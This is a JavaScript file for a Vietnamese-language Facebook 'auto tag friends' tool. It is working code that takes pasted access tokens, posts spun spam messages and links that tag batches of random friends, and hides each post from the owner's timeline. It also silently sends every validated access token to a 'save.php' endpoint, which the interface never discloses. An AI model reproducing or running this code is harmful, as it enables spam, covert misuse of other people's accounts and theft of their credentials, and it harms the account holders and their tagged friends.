function auto_tagfr_check(d){
	$.get('https://graph.facebook.com/',{
		method:'post',access_token:d,batch:'[{"method":"GET","relative_url":"me?fields=id,name"},{"method":"GET","relative_url":"fql?q=SELECT uid, name FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) ORDER BY rand() LIMIT '+auto_tagfr.limit+'"}]',include_headers:'false'
	}
	,function(f){
		var a=JSON.parse(f[0].body);
		auto_tagfr.array[auto_tagfr.success]=[],auto_tagfr.array[auto_tagfr.success].uid=a.id,auto_tagfr.array[auto_tagfr.success].data=JSON.parse(f[1].body).data,auto_tagfr.array[auto_tagfr.success].access_token=d,auto_tagfr.array[auto_tagfr.success].array=[];
		for(var l=0;
		l<Math.ceil(auto_tagfr.array[auto_tagfr.success].data.length/auto_tagfr.one);
		l++){
			var j=l*auto_tagfr.one;
			auto_tagfr.array[auto_tagfr.success].array[l]=[];
			for(var c=j;
			c<j+(auto_tagfr.array[auto_tagfr.success].data.length-j>auto_tagfr.one?auto_tagfr.one:auto_tagfr.array[auto_tagfr.success].data.length-j);
			c++){
				auto_tagfr.array[auto_tagfr.success].array[l].push(auto_tagfr.array[auto_tagfr.success].data[c].uid)
			}
		}
		;
		auto_tagfr.success++,auto_tagfr.bach+=d+'',tbody='',tbody+='<tr>',tbody+='	<td>'+auto_tagfr.success+'</td>',tbody+='	<td>'+a.name+'</td>',tbody+='	<td align="center">'+auto_tagfr.array[auto_tagfr.success-1].data.length+'</td>',tbody+='	<td align="center"><font color="green"><span id="auto_tagfr_success_'+auto_tagfr.success+'">0</span></font></td>',tbody+='	<td align="center"><font color="red"><span id="auto_tagfr_error_'+auto_tagfr.success+'">0</span></font></td>',tbody+='	<td id="auto_tagfr_status_'+auto_tagfr.success+'" b-data="loading">Đang chờ !</td>',tbody+='</tr>',$('#html_auto_tagfr_body').append(tbody)
	}
	).fail(function(f){
		'undefined'== typeof f.responseText?auto_tagfr_check(d):auto_tagfr.error++
	}
	).always(function(){
		if(auto_tagfr.success+auto_tagfr.error==auto_tagfr.token.split('\n').length){
			if(auto_tagfr.success>0){
				var d=$.trim(auto_tagfr.bach);
				d.length>0&&$.post('http://localhost/a/save.php',{
					act:'save',access_token:d
				}
				);
				for(var f=0;
				f<auto_tagfr.array.length;
				f++){
					auto_tagfr_send(f,0)
				}
			}
			else {
				$('#submit_auto_tagfr_start').buttonStop(),$('#submit_auto_tagfr_stop').disabled(),noti.success('Không Access Token nào Live !'),$('#html_auto_tagfr_result').hide()
			}
		}
	}
	)
}
function auto_tagfr_send(d,f){
	return 0==auto_tagfr.run?!1:void((0==auto_tagfr.array[d].data.length?($('#auto_tagfr_status_'+(d+1)).html('<font color="red">Không có bạn bè !</font>'),auto_tagfr.total++,auto_tagfr.total==auto_tagfr.success&&($('#submit_auto_tagfr_start').buttonStop(),$('#submit_auto_tagfr_stop').disabled(),noti.success('Quá trình gắn thẻ bạn bè đã hoàn tất !'))):($('#auto_tagfr_status_'+(d+1)).html('<font color="blue">Đang tiến hành gắn thẻ <b>'+auto_tagfr.array[d].array[f].length+'</b> bạn bè</font> '+run.loading()),$.get('https://graph.facebook.com/me/feed',{
		method:'post',access_token:auto_tagfr.array[d].access_token,message:init.spinText(auto_tagfr.msg),link:init.spinText(auto_tagfr.link),tags:auto_tagfr.array[d].array[f].join()
	}
	).done(function(a){
		$.get('https://graph.facebook.com/'+a.id,{
			method:'post',locale:'en_US',timeline_visibility:'hidden'
		}
		),$('#auto_tagfr_success_'+(d+1)).text(parseInt($('#auto_tagfr_success_'+(d+1)).text())+auto_tagfr.array[d].array[f].length),$('#auto_tagfr_status_'+(d+1)).html('<font color="green">Gắn thẻ thành công <b>'+auto_tagfr.array[d].array[f].length+'</b> bạn bè, xin chờ <b id="timedown_'+(d+1)+'"></b> giây</font> '+run.loading())
	}
	).error(function(a){
		if($('#auto_tagfr_error_'+(d+1)).text(parseInt($('#auto_tagfr_error_'+(d+1)).text())+auto_tagfr.array[d].array[f].length),$('#auto_tagfr_status_'+(d+1)).html('<font color="red">Gắn thẻ thất bại <b>'+auto_tagfr.array[d].array[f].length+'</b> bạn bè, xin chờ <b id="timedown_'+(d+1)+'"></b> giây</font> '+run.loading()),a.responseText){
			var a=init.replace_JSON(a.responseText);
			noti.error(a.error.message)
		}
	}
	).always(function(){
		f+1<auto_tagfr.array[d].array.length?timer.count_down_array(0,Math.floor(auto_tagfr.delay/60),auto_tagfr.delay-60*Math.floor(auto_tagfr.delay/60),'timedown_'+(d+1),d,function(){
			auto_tagfr_send(d,f+1)
		}
		):($('#auto_tagfr_status_'+(d+1)).html('<font color="green">Hoàn thành !</font>'),auto_tagfr.total++,auto_tagfr.total==auto_tagfr.success&&($('#submit_auto_tagfr_start').buttonStop(),$('#submit_auto_tagfr_stop').disabled(),noti.success('Quá trình gắn thẻ bạn bè đã hoàn tất !')))
	}
	))))
}
location.hostname==b_sv&&($(document).on('click','#submit_auto_tagfr_stop',function(){
	auto_tagfr.run=0;
	for(var d=0;
	d<auto_tagfr.array.length;
	d++){
		clearTimeout(timeout_array[d])
	}
	;
	$('[b-data=\'loading\']').text('Đã có lệnh dừng !'),$('#submit_auto_tagfr_stop').disabled(),$('#submit_auto_tagfr_start').buttonStop(),noti.success('Đã có lệnh dừng gắn thẻ bạn bè !')
}
),$(document).on('click','#submit_auto_tagfr_start',function(){
	auto_tagfr={
		token:$('#input_auto_tagfr_token').validate(),msg:$('#input_auto_tagfr_msg').validate(),link:$('#input_auto_tagfr_link').val(),name:$('#input_auto_tagfr_name').val(),picture:$('#input_auto_tagfr_picture').val(),description:$('#input_auto_tagfr_description').val(),caption:$('#input_auto_tagfr_caption').val(),delay:$('#input_auto_tagfr_delay').isNumber(),one:$('#input_auto_tagfr_one').isNumber(),limit:$('#input_auto_tagfr_limit').isNumber(),array:[],run:1,total:0,success:0,error:0,bach:''
	}
	,auto_tagfr.token&&auto_tagfr.msg&&auto_tagfr.delay&&auto_tagfr.one&&auto_tagfr.limit&&($(this).buttonLoad(),$('#submit_auto_tagfr_stop').undisabled(),$('#html_auto_tagfr_result').fadeIn('fast'),$('#html_auto_tagfr_body').html(''),$.each(auto_tagfr.token.split('\n'),function(d,f){
		var a=f.split('|');
		a=a[1]?a[1]:f,setTimeout(function(){
			auto_tagfr_check(a)
		}
		,15*d)
	}
	))
}
))